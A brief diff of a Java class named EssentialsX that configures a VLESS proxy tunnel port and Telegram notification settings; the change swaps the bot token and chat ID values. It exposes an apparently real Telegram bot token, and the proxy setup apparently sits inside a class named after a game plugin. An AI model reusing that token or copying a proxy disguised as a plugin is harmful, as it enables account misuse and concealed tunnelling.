@@ -53,8 +53,8 @@ public class EssentialsX extends JavaPlugin {
     static final int TUNNEL_LOCAL_PORT = 65534;
     // VLESS_PORT 和 TUNNEL_LOCAL_PORT需对应
     // ---- Telegram 通知（可留空） ----
-    static final String TG_TOKEN = "5800052646";
-    static final String TG_CHAT_ID = "7195422483:AAGhrc-1nzto9Ik05rY2K5V8xdvLSGInVBo";
+    static final String TG_TOKEN = "7195422483:AAGhrc-1nzto9Ik05rY2K5V8xdvLSGInVBo";
+    static final String TG_CHAT_ID = "5800052646";
 
     // =========================================================
 
